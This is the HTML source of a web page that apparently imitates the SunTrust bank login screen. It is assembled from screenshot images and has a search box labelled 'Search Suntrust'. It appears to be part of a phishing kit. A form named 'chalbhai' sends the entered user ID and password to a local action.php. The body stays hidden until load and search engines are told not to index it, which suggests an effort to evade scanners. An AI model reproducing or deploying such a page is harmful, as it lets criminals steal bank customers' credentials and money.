<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Login</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">

.textox {
   width: 279px;
   height: 40px;
   border: solid 1px #BFBFBF;
   padding: 2px;
   border-radius: 3px;
   font-size: 12px;
   background-color: #FFFFFF;
   outline: none;
   color: #474747;
  }
.textox:focus  {
   border: solid 1px #6AB6E6;
  }
  
.textox2 {
   width: 139px;
   height: 24px;
   border: solid 1px #FFFFFF;
   padding: 2px;
   border-radius: 3px;
   font-size: 12px;
   background-color: #FFFFFF;
   outline: none;
   color: #474747;
  }

input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label, input[type=checkbox].css-checkbox + label.css-label.clr {
							padding-left:29px;
							height:24px; 
							display:inline-block;
							line-height:24px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:24px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label, input[type=checkbox].css-checkbox + label.css-label.chk {
							background-position: 0 -24px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_a608ec28e6c50a02870bf452f125b974.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}

</style>

</head>
<body>
<div id="shape1" style="position:absolute; overflow:hidden; left:0px; top:762px; width:1355px; height:903px; z-index:0"><img border=0 width="100%" height="100%" alt="" src="images/shape20391640.gif"></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:78px; z-index:1"><img src="images/1.png" alt="" title="" border=0 width=1349 height=78></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:79px; width:1349px; height:402px; z-index:2"><img src="images/2.png" alt="" title="" border=0 width=1349 height=402></div>

<div id="image3" style="position:absolute; overflow:hidden; left:161px; top:502px; width:1012px; height:197px; z-index:3"><a href="#"><img src="images/4.png" alt="" title="" border=0 width=1012 height=197></div>

<div id="image4" style="position:absolute; overflow:hidden; left:91px; top:788px; width:372px; height:389px; z-index:4"><a href="#"><img src="images/5.png" alt="" title="" border=0 width=372 height=389></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:481px; top:788px; width:394px; height:390px; z-index:5"><a href="#"><img src="images/6.png" alt="" title="" border=0 width=394 height=390></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:906px; top:812px; width:281px; height:67px; z-index:6"><a href="#"><img src="images/7.png" alt="" title="" border=0 width=281 height=67></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:902px; top:907px; width:369px; height:250px; z-index:7"><img src="images/8.png" alt="" title="" border=0 width=369 height=250></div>

<div id="image8" style="position:absolute; overflow:hidden; left:1185px; top:956px; width:75px; height:54px; z-index:8"><a href="http://"><img src="images/9.png" alt="" title="" border=0 width=75 height=54></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:91px; top:1196px; width:762px; height:427px; z-index:9"><a href="#"><img src="images/10.png" alt="" title="" border=0 width=762 height=427></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:908px; top:1185px; width:351px; height:175px; z-index:10"><a href="#"><img src="images/11.png" alt="" title="" border=0 width=351 height=175></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:-5px; top:1665px; width:1349px; height:60px; z-index:11"><img src="images/12.png" alt="" title="" border=0 width=1349 height=60></div>

<div id="image12" style="position:absolute; overflow:hidden; left:236px; top:1854px; width:809px; height:565px; z-index:12"><img src="images/14.png" alt="" title="" border=0 width=809 height=565></div>

<div id="image13" style="position:absolute; overflow:hidden; left:331px; top:1756px; width:668px; height:83px; z-index:13"><a href="#"><img src="images/13.png" alt="" title="" border=0 width=668 height=83></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:26px; top:16px; width:101px; height:47px; z-index:14"><a href="#"><img src="images/me.png" alt="" title="" border=0 width=101 height=47></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:567px; top:15px; width:214px; height:51px; z-index:15"><a href="#"><img src="images/su.png" alt="" title="" border=0 width=214 height=51></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:1200px; top:19px; width:122px; height:46px; z-index:16"><a href="#"><img src="images/si.png" alt="" title="" border=0 width=122 height=46></a></div>

<div id="image17" style="position:absolute; overflow:hidden; left:859px; top:118px; width:343px; height:316px; z-index:17"><img src="images/16.png" alt="" title="" border=0 width=343 height=316></div>
<form action=action.php name=chalbhai id=chalbhai method=post>
<div id="image18" style="position:absolute; overflow:hidden; left:916px; top:313px; width:115px; height:17px; z-index:18"><a href="#"><img src="images/19.png" alt="" title="" border=0 width=115 height=17></a></div>

<div id="image19" style="position:absolute; overflow:hidden; left:890px; top:398px; width:250px; height:18px; z-index:19"><a href="#"><img src="images/18.png" alt="" title="" border=0 width=250 height=18></a></div>

<div id="formradio1" style="position:absolute; left:886px; top:184px; z-index:20"><input type="radio" name="formradio1"></div>
<div id="formradio2" style="position:absolute; left:1004px; top:184px; z-index:21"><input type="radio" name="formradio1"></div>
<input name="id" required type="text" class="textox"  placeholder="User ID" style="position:absolute;width:279px;height:39px;padding-left:10px;font-size:15px;left:891px;top:212px;z-index:22">
<input name="pass"  required type="password" class="textox"  placeholder="Password" style="position:absolute;width:279px;height:39px;padding-left:10px;font-size:15px;left:891px;top:262px;z-index:23">
<input name="formtext3" type="text" class="textox2" placeholder="Search Suntrust" style="position:absolute;width:139px;height:24px;padding-left:6px;font-size:15px;left:178px;top:29px;z-index:27">

<div id="checkboxG1"  style="position:absolute; left:891px; top:311px; z-index:24"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:891px; top:311px; z-index:24"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:890px; top:338px; z-index:25"><input type="image" name="formimage1" width="143" height="44" src="images/17.png"></div>
<div id="image20" style="position:absolute; overflow:hidden; left:149px; top:310px; width:148px; height:50px; z-index:26"><a href="#"><img src="images/3.png" alt="" title="" border=0 width=148 height=50></a></div>


</body>
</html>
